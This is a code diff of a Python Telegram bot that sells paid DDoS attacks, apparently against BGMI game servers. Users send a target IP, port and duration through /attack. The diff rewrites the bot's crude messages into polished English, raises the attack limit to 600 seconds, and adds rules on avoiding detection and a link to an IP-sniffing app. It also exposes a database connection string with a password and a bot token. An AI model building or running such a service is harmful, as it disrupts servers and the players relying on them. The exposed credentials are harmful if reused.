@@ -15,14 +15,12 @@ import aiohttp
 from telebot import types
 import pytz
 import psutil
+from raj import TOKEN, FORWARD_CHANNEL_ID, CHANNEL_ID, error_channel_id
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '8050966708:AAHMNh2Bl1qrIbYPwUAshAA01bD6Elxxxc4'
+
 MONGO_URI = 'mongodb+srv://ww6715014:pramod74567890@madarchod.zabgi.mongodb.net/?retryWrites=true&w=majority&appName=Madarchod'
-FORWARD_CHANNEL_ID = -1002338525976
-CHANNEL_ID = -1002338525976
-error_channel_id = -1002338525976
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -88,9 +86,9 @@ async def start_asyncio_loop():
 def create_inline_keyboard():
     markup = types.InlineKeyboardMarkup()
     button3 = types.InlineKeyboardButton(
-        text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="")
+        text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/RRAJARAJ_04")
     button1 = types.InlineKeyboardButton(text="👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤",
-        url="https://t.me/Gggjhjj_bot")
+        url="https://t.me/rajaraj_04")
     markup.add(button3)
     markup.add(button1)
     return markup
@@ -120,29 +118,29 @@ def extend_and_clean_expired_users():
                     try:
                         bot.send_message(
                             user_id,
-                            f"*⚠️ access khatam lode! ⚠️*\n"
+                            f"*⚠️ Access Expired! ⚠️*\n"
                             f"Your access expired on {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}.\n"
-                            f"mje kro bhai : {time_approved_str if time_approved_str else 'N/A'}\n"
+                            f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                             f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
-                            f"kya haal chaal sare ya ne. 💬",
+                            f"If you believe this is a mistake or wish to renew your access, please contact support. 💬",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                         )
 
                         if approving_admin_id:
                             bot.send_message(
                                 approving_admin_id,
-                                f"*🔴 User {username} (ID: {user_id}) apko nikala jaata h kyuki aapka time khatam ho gya.*\n"
-                                f"🕒mje kro bhai: {time_approved_str if time_approved_str else 'N/A'}\n"
+                                f"*🔴 User {username} (ID: {user_id}) has been automatically removed due to expired access.*\n"
+                                f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                                 f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
-                                f"🚫 dekh: nikal diya*",
+                                f"🚫 Status: Removed*",
                                 reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                             )
                     except Exception as e:
-                        logging.error(f"galt h lode user {user_id}: {e}")
+                        logging.error(f"Failed to send message for user {user_id}: {e}")
 
                     result = users_collection.delete_one({"user_id": user_id})
                     if result.deleted_count > 0:
-                        logging.info(f"User {user_id} aaram se. 🗑️")
+                        logging.info(f"User {user_id} has been removed from the database. 🗑️")
                     else:
                         logging.warning(f"Failed to remove user {user_id} from the database. ⚠️")
             except ValueError as e:
@@ -159,9 +157,9 @@ async def run_attack_command_async(chat_id, target_ip, target_port, duration):
     bot.attack_in_progress = False
     
     # Notify the user about the attack completion
-    bot.send_message(chat_id, "*😈 Attack khatam lode! 💣*\n"
-                               "*shi se attack lga na.*\n"
-                               "*bgmi ki maa chod diye!*", 
+    bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n"
+                               "*The attack has been successfully executed.*\n"
+                               "*Thank you for using our service!*", 
                                reply_markup=create_inline_keyboard(), parse_mode='Markdown')
 
 
@@ -182,9 +180,9 @@ def approve_or_disapprove_user(message):
     if not is_admin:
         bot.send_message(
             chat_id,
-            "🚫 *access nhi h lode !*\n"
-            "❌ *tune paid nhi liya bdwe.*\n"
-            "💬 *paid lene ke liye dm kr @rajaraj_04.*",
+            "🚫 *Access Denied!*\n"
+            "❌ *You don't have the required permissions to use this command.*\n"
+            "💬 *Please contact the bot owner if you believe this is a mistake.*",
             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
         return
 
@@ -249,23 +247,23 @@ def approve_or_disapprove_user(message):
         # Message to the approving admin
         bot.send_message(
             chat_id,
-            f"✅ *le de diya access!*\n"
+            f"✅ *Approval Successful!*\n"
             f"👤 *User ID:* `{target_user_id}`\n"
             f"📋 *Plan:* `{plan}`\n"
             f"⏳ *Duration:* `{days} days`\n"
-            f"🎉 *apko access mil gya h enjoy .*\n"
-            f"🚀 *apke paise ke hisab se apko date diya jayega.*",
+            f"🎉 *The user has been approved and their account is now active.*\n"
+            f"🚀 *They will be able to use the bot's commands according to their plan.*",
             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
 
         # Message to the target user
         bot.send_message(
             target_user_id,
-            f"🎉 *🛑 MAA CHOD DE BHAI, {target_user_id}!*\n"
-            f"✅ *tum approved ho!*\n"
+            f"🎉 *Congratulations, {target_user_id}!*\n"
+            f"✅ *Your account has been approved!*\n"
             f"📋 *Plan:* `{plan}`\n"
             f"⏳ *Valid for:* `{days} days`\n"
-            f"🔥 *attack lagane ke liye /attack try kro.*\n"
-            f"💡 *RAJA PAID DDOS .*",
+            f"🔥 *You can now use the /attack command to unleash the full power of your plan.*\n"
+            f"💡 *Thank you for choosing our service! If you have any questions, don't hesitate to ask.*",
             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
 
         # Message to the channel
@@ -348,8 +346,8 @@ def handle_attack_command(message):
                                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')
             return
 
-        if duration > 300:
-            bot.send_message(chat_id, "*⏳ The maximum duration allowed is 300 seconds.*\n"
+        if duration > 600:
+            bot.send_message(chat_id, "*⏳ The maximum duration allowed is 600 seconds.*\n"
                                        "*Please reduce the duration and try again!*", 
                                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')
             return
@@ -360,10 +358,10 @@ def handle_attack_command(message):
         bot.attack_start_time = time.time()
 
         # Send the initial attack message
-        sent_message = bot.send_message(chat_id, f"*😈 Sever ko chodna chalu! 🚀*\n\n"
-                                                 f"*🫣Room bgmi: {target_ip}*\n"
-                                                 f"*Room No: {target_port}*\n"
-                                                 f"*🔥Kitne ghante: {duration} seconds remaining*\n"
+        sent_message = bot.send_message(chat_id, f"*🚀 Attack Initiated! 🚀*\n\n"
+                                                 f"*📡 Target Host: {target_ip}*\n"
+                                                 f"*👉 Target Port: {target_port}*\n"
+                                                 f"*⏰ Duration: {duration} seconds remaining*\n"
                                                  "*Prepare for action! 🔥*", 
                                                  reply_markup=create_inline_keyboard(), parse_mode='Markdown')
 
@@ -381,10 +379,11 @@ def handle_attack_command(message):
             elapsed_time = time.time() - bot.attack_start_time
             remaining_time = max(0, bot.attack_duration - int(elapsed_time))
 
-            new_message_text = (f"*🫣Room bgmi: {target_ip}*\n"
-                                                 f"*Room No: {target_port}*\n"
-                                                 f"*🔥Kitne ghante: {duration} seconds remaining*\n"
-                                                 "*Prepare for action! 🔥*")
+            new_message_text = (f"*🚀 Attack Initiated! 🚀*\n\n"
+                                f"*📡 Target Host: {target_ip}*\n"
+                                f"*👉 Target Port: {target_port}*\n"
+                                f"*⏰ Duration: {remaining_time} seconds remaining*\n"
+                                "*Prepare for action! 🔥*")
 
             # Only update the message if the content has changed
             if new_message_text != last_message_text:
@@ -427,4 +426,163 @@ def when_command(message):
                                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')
     else:
         bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
-                                   "*🔄 Feel free to initi
+                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", 
+                                   reply_markup=create_inline_keyboard(), parse_mode='Markdown')
+
+
+@bot.message_handler(commands=['myinfo'])
+def myinfo_command(message):
+    try:
+        user_id = message.from_user.id
+        user_data = users_collection.find_one({"user_id": user_id})
+
+        # Set timezone and format date/time
+        tz = pytz.timezone('Asia/Kolkata')
+        now = datetime.now(tz)
+        current_date = now.date().strftime("%Y-%m-%d")
+        current_time = now.strftime("%I:%M:%S %p")
+
+        if not user_data:
+            response = (
+                "*⚠️ No account information found. ⚠️*\n"
+                "*It looks like you don't have an account with us.*\n"
+                "*Please contact the owner for assistance.*\n"
+            )
+            markup = types.InlineKeyboardMarkup()
+            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
+                                                 url="https://t.me/rajaraj_04")
+            button2 = types.InlineKeyboardButton(
+                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/RRAJARAJ_04/5")
+            markup.add(button1)
+            markup.add(button2)
+        else:
+            username = message.from_user.username or "Unknown User"
+            plan = user_data.get('plan', 'N/A')
+            valid_until = user_data.get('valid_until', 'N/A')
+
+            response = (
+                f"*👤 Username: @{username}*\n"
+                f"*💼 Plan: {plan} ₹*\n"
+                f"*📅 Valid Until: {valid_until}*\n"
+                f"*📆 Current Date: {current_date}*\n"
+                f"*🕒 Current Time: {current_time}*\n"
+                "*🎉 Thank you for being with us! 🎉*\n"
+                "*If you need any help or have questions, feel free to ask.* 💬"
+            )
+            markup = types.InlineKeyboardMarkup()
+            button = types.InlineKeyboardButton(
+                text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/+TBF5xrdXnclhNGI1")
+            markup.add(button)
+
+        bot.send_message(message.chat.id,
+                         response,
+                         parse_mode='Markdown',
+                         reply_markup=markup)
+    except Exception as e:
+        logging.error(f"Error handling /myinfo command: {e}")
+
+@bot.message_handler(commands=['rules'])
+def rules_command(message):
+    rules_text = (
+        "*📜 Bot Rules - Keep It Cool!\n\n"
+        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
+        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
+        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
+        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
+        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
+        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
+        "💡 Follow the rules and let’s enjoy gaming together!*"
+    )
+
+    try:
+        bot.send_message(message.chat.id, rules_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error while processing /rules command: {e}")
+
+    except Exception as e:
+        print(f"Error while processing /rules command: {e}")
+
+
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
+                 "*Here’s what you can do:* \n"
+                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
+                 "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
+                 "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
+                 "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
+                 "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
+                 "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
+                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")
+
+    try:
+        bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error while processing /help command: {e}")
+
+
+
+@bot.message_handler(commands=['owner'])
+def owner_command(message):
+    response = (
+        "*👤 **Owner Information:**\n\n"
+        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
+        "📩 **Telegram:** @rajaraj_04\n\n"
+        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
+        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
+    )
+    bot.send_message(message.chat.id, response, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
+
+@bot.message_handler(commands=['start'])
+def start_message(message):
+    try:
+        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
+                                           "*🚀 Get ready to dive into the action!*\n\n"
+                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
+                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
+                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
+                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
+                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥", 
+                                           reply_markup=create_inline_keyboard(), parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error while processing /start command: {e}")
+        
+@bot.message_handler(commands=['canary'])
+def canary_command(message):
+    response = ("*📥 Download the HttpCanary APK Now! 📥*\n\n"
+                "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
+                "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
+                "*Choose your platform:*")
+
+    markup = types.InlineKeyboardMarkup()
+    button1 = types.InlineKeyboardButton(
+        text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
+        url="https://t.me/RRAJARAJ_04/303")
+    button2 = types.InlineKeyboardButton(
+        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
+        url="https://apps.apple.com/in/app/surge-5/id1442620678")
+
+    markup.add(button1)
+    markup.add(button2)
+
+    try:
+        bot.send_message(message.chat.id,
+                         response,
+                         parse_mode='Markdown',
+                         reply_markup=markup)
+    except Exception as e:
+        logging.error(f"Error while processing /canary command: {e}")
+
+
+if __name__ == "__main__":
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread.start()
+    extend_and_clean_expired_users()
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)
